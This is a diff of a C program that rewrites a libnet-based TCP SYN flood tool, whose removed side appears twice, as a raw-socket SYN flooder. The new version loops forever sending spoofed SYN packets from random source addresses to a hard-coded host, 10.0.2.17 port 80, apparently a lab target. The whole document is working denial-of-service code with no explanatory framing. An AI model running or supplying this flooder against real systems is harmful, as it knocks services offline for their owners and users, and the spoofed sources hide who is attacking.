@@ -1,156 +1,170 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
-#include <netinet/in.h>
-#include <libnet.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <arpa/inet.h>
+#include <time.h>
 
-#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms.
+#define PACKET_LEN 4096
+#define TH_SYN 0x02
 
-/* Returns an IP in x.x.x.x notation */
-char *print_ip(u_long *ip_addr_ptr) {
-    return inet_ntoa(*((struct in_addr *)ip_addr_ptr));
-}
+#define DEST_IP "10.0.2.17"
+#define DEST_PORT 80
 
-int main(int argc, char *argv[]) {
-    u_long dest_ip;
-    u_short dest_port;
-    u_char *packet;
-    int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;
+/* IP Header */
+struct ipheader
+{
+    unsigned char      iph_ihl:4, //IP header length
+                       iph_ver:4; //IP version
+    unsigned char      iph_tos; //Type of service
+    unsigned short int iph_len; //IP Packet length (data + header)
+    unsigned short int iph_ident; //Identification
+    unsigned short int iph_flag:3, //Fragmentation flags
+                       iph_offset:13; //Flag offset
+    unsigned char      iph_ttl; //Time to Live
+    unsigned char      iph_protocol; //Protocol type
+    unsigned short int iph_chksum; //IP datagram checksum
+    struct in_addr     iph_sourceip; //Source IP address
+    struct in_addr     iph_destip; //Destination IP address
+};
 
-    if (argc < 3) {
-        printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
-        exit(1);
+/* TCP Header */
+struct tcpheader
+{
+    unsigned short int tcp_sport; // Source port
+    unsigned short int tcp_dport; // Destination port
+    unsigned int       tcp_seq; // Sequence number
+    unsigned int       tcp_ack; // Acknowledgment number
+    unsigned char      tcp_offx2; // Data offset, rsvd
+    unsigned char      tcp_flags; // Control flags
+    unsigned short int tcp_win; // Window
+    unsigned short int tcp_sum; // Checksum
+    unsigned short int tcp_sun; // Urgent pointer
+};
+
+/* Pseudo TCP header */
+struct pseudo_tcp
+{
+    unsigned saddr, daddr;
+    unsigned char mbz;
+    unsigned char ptcl;
+    unsigned short tcpl;
+    struct tcpheader tcp;
+    char payload[PACKET_LEN];
+};
+
+unsigned short calculate_tcp_checksum(struct ipheader *ip);
+
+unsigned short in_cksum(unsigned short *buf, int length);
+
+void send_raw_ip_packet(struct ipheader* ip);
+
+int main() {
+    char buffer[PACKET_LEN];
+    struct ipheader *ip = (struct ipheader *) buffer;
+    struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));
+
+    srand(time(0)); // Initialize the seed for random # generation.
+    while(1) {
+        memset(buffer, 0, PACKET_LEN);
+
+        // Fill in the TCP header.
+        tcp->tcp_sport = rand(); // Use random source port
+        tcp->tcp_dport = htons(DEST_PORT);
+        tcp->tcp_seq = rand(); // Use random sequence #
+        tcp->tcp_ack = 0; // Acknowledgment number
+        tcp->tcp_offx2 = 0x50;
+        tcp->tcp_flags = TH_SYN; // Enable SYN bit
+        tcp->tcp_win = htons(20000);
+        tcp->tcp_sun = 0;
+
+        // Fill in the IP header
+        ip->iph_ver = 4; // Version (IPv4)
+        ip->iph_ihl = 5; // Header length
+        ip->iph_ttl = 50; // Time to live
+        ip->iph_sourceip.s_addr = rand(); // Use a random IP address
+        ip->iph_destip.s_addr = inet_addr(DEST_IP);
+        ip->iph_protocol = IPPROTO_TCP; // The value is 6
+        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
+
+        // Calculate tcp checksum
+        tcp->tcp_sum = calculate_tcp_checksum(ip);
+
+        // Send the spoofed packet
+        send_raw_ip_packet(ip);
     }
-    dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // The host
-    dest_port = (u_short)atoi(argv[2]);                     // The port
-
-    network = libnet_open_raw_sock(IPPROTO_RAW); // Open network interface.
-    if (network == -1)
-        libnet_error(LIBNET_ERR_FATAL, "can't open network interface. -- this program must run as root.\n");
-
-    packet = malloc(packet_size); // Allocate memory for packet.
-    if (packet == NULL)
-        libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");
-
-    libnet_seed_prand(); // Seed the random number generator.
-
-    printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
-    while (1) // loop forever (until break by CTRL-C)
-    {
-        libnet_build_ip(LIBNET_TCP_H,
-            IPTOS_LOWDELAY,                 // IP tos
-            libnet_get_prand(LIBNET_PRu16), // IP ID (randomized)
-            0,                              // Frag stuff
-            libnet_get_prand(LIBNET_PR8),   // TTL (randomized)
-            IPPROTO_TCP,                    // Transport protocol
-            libnet_get_prand(LIBNET_PRu32), // Source IP (randomized)
-            dest_ip,                        // Destination IP
-            NULL,                           // Payload (none)
-            0,                              // Payload length
-            packet);                        // Packet header memory
-
-        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port (random)
-            dest_port,                                  // Destination TCP port
-            libnet_get_prand(LIBNET_PRu32),             // Sequence number (randomized)
-            libnet_get_prand(LIBNET_PRu32),             // Acknowledgement number (randomized)
-            TH_SYN,                                     // Control flags (SYN flag set only)
-            libnet_get_prand(LIBNET_PRu16),             // Window size (randomized)
-            0,                                          // Urgent pointer
-            NULL,                                       // Payload (none)
-            0,                                          // Payload length
-            packet + LIBNET_IP_H);                      // Packet header memory
-
-        if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
-            libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");
-
-        byte_count = libnet_write_ip(network, packet, packet_size); // Inject packet.
-        if (byte_count < packet_size)
-            libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written. (%d of %d bytes) ", byte_count, packet_size);
-
-        usleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds.
-    }
-    free(packet); // Free packet memory.
-
-    if (libnet_close_raw_sock(network) == -1) // Close the network interface.
-        libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");
-
     return 0;
 }
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <netinet/in.h>
-#include <libnet.h>
 
-#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms.
+unsigned short calculate_tcp_checksum(struct ipheader *ip)
+{
+    struct tcpheader *tcp = (struct tcpheader *) ((unsigned char *)ip + sizeof(struct ipheader));
 
-/* Returns an IP in x.x.x.x notation */
-char *print_ip(u_long *ip_addr_ptr) {
-    return inet_ntoa(*((struct in_addr *)ip_addr_ptr));
+    int tcp_len = ntohs(ip->iph_len) - sizeof(struct ipheader);
+
+    /* pseudo tcp header for the checksum computation */
+    struct pseudo_tcp p_tcp;
+    memset(&p_tcp, 0x0, sizeof(struct pseudo_tcp));
+
+    p_tcp.saddr = ip->iph_sourceip.s_addr;
+    p_tcp.daddr = ip->iph_destip.s_addr;
+    p_tcp.mbz = 0;
+    p_tcp.ptcl = IPPROTO_TCP;
+    p_tcp.tcpl = htons(tcp_len);
+    memcpy(&p_tcp.tcp, tcp, tcp_len);
+
+    return (unsigned short) in_cksum((unsigned short *)&p_tcp, tcp_len + 12);
 }
 
-int main(int argc, char *argv[]) {
-    u_long dest_ip;
-    u_short dest_port;
-    u_char *packet;
-    int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;
+unsigned short in_cksum(unsigned short *buf, int length) // this function calculates the checksum for a given buffer.
+{
+    unsigned short *w = buf;
+    int nleft = length;
+    int sum = 0;
+    unsigned short temp=0;
 
-    if (argc < 3) {
-        printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
-        exit(1);
+    /*
+     * The algorithm uses a 32 bit accumulator (sum), adds sequential 16 bit words to it, and at the end, folds back all
+     * the carry bits from the top 16 bits into the lower 16 bits.
+    */
+    while (nleft > 1) {
+        sum += *w++;
+        nleft -= 2;
     }
-    dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // The host
-    dest_port = (u_short)atoi(argv[2]);                     // The port
 
-    network = libnet_open_raw_sock(IPPROTO_RAW); // Open network interface.
-    if (network == -1)
-        libnet_error(LIBNET_ERR_FATAL, "can't open network interface. -- this program must run as root.\n");
-
-    packet = malloc(packet_size); // Allocate memory for packet.
-    if (packet == NULL)
-        libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");
-
-    libnet_seed_prand(); // Seed the random number generator.
-
-    printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
-    while (1) // loop forever (until break by CTRL-C)
-    {
-        libnet_build_ip(LIBNET_TCP_H,
-            IPTOS_LOWDELAY,                 // IP tos
-            libnet_get_prand(LIBNET_PRu16), // IP ID (randomized)
-            0,                              // Frag stuff
-            libnet_get_prand(LIBNET_PR8),   // TTL (randomized)
-            IPPROTO_TCP,                    // Transport protocol
-            libnet_get_prand(LIBNET_PRu32), // Source IP (randomized)
-            dest_ip,                        // Destination IP
-            NULL,                           // Payload (none)
-            0,                              // Payload length
-            packet);                        // Packet header memory
-
-        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port (random)
-            dest_port,                                  // Destination TCP port
-            libnet_get_prand(LIBNET_PRu32),             // Sequence number (randomized)
-            libnet_get_prand(LIBNET_PRu32),             // Acknowledgement number (randomized)
-            TH_SYN,                                     // Control flags (SYN flag set only)
-            libnet_get_prand(LIBNET_PRu16),             // Window size (randomized)
-            0,                                          // Urgent pointer
-            NULL,                                       // Payload (none)
-            0,                                          // Payload length
-            packet + LIBNET_IP_H);                      // Packet header memory
-
-        if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
-            libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");
-
-        byte_count = libnet_write_ip(network, packet, packet_size); // Inject packet.
-        if (byte_count < packet_size)
-            libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written. (%d of %d bytes) ", byte_count, packet_size);
-
-        usleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds.
+    /* treat the odd byte at the end, if any */
+    if (nleft == 1) {
+        *(unsigned char *) (&temp) = * (unsigned char *)w ;
+        sum += temp;
     }
-    free(packet); // Free packet memory.
 
-    if (libnet_close_raw_sock(network) == -1) // Close the network interface.
-        libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");
+    /* add back carry outs from the top 16 bits to low 16 bits */
+    sum = (sum >> 16) + (sum & 0xffff); // add high 16 to low 16
+    sum += (sum >> 16);
+    return (unsigned short) (~sum);
+}
 
-    return 0;
+void send_raw_ip_packet(struct ipheader* ip)
+{
+    struct sockaddr_in dest_info;
+    int enable=1;
+
+    // Step 1: Create a raw network socket.
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+    // Step 2: Set socket option.
+    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
+
+    // Step 3: Provide needed information about the destination.
+    dest_info.sin_family = AF_INET;
+    dest_info.sin_addr = ip->iph_destip;
+
+    // Step 4: Send the packet out.
+    sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
+
+    // Step 5: Close the packet
+    close(sock);
 }
